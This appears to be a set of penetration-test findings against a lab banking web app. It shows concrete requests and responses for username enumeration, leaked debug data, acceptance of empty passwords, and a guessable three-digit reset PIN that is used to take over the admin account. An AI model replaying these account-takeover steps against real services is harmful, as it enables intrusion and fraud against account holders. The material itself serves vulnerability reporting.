1. POST http://bank:5000/api/v2/forgot-password with {"username":"admin"} -> {"status":"success"}
2. POST http://bank:5000/api/v2/forgot-password with {"username":"nonexistent_xyz"} -> {"status":"error","message":"User not found"}
3. An attacker can confirm valid usernames by observing the status field difference

1. POST http://bank:5000/login with valid credentials
2. Response includes: {"debug_info": {"account_number": "ADMIN001", "is_admin": true, "login_time": "2026-04-24...", "user_id": 1, "username": "admin"}}
3. Account number is immediately known after login without needing to query another endpoint

1. POST http://bank:5000/register with {"username":"weakuser","password":"1"}
2. Response: {"status":"success","message":"Registration successful"}
3. POST http://bank:5000/register with {"username":"weakuser2","password":""} also succeeds (empty password)
4. No password strength enforcement

1. POST http://bank:5000/api/v1/reset-password with wrong PIN: {"username":"admin","reset_pin":"000","new_password":"test"}
2. Response: {"debug_info": {"attempted_pin": "000", "reset_success": false}}
3. POST with correct PIN: {"username":"admin","reset_pin":"959","new_password":"hacked"}
4. Response: {"debug_info": {"reset_pin_used": "959", "reset_success": true}}

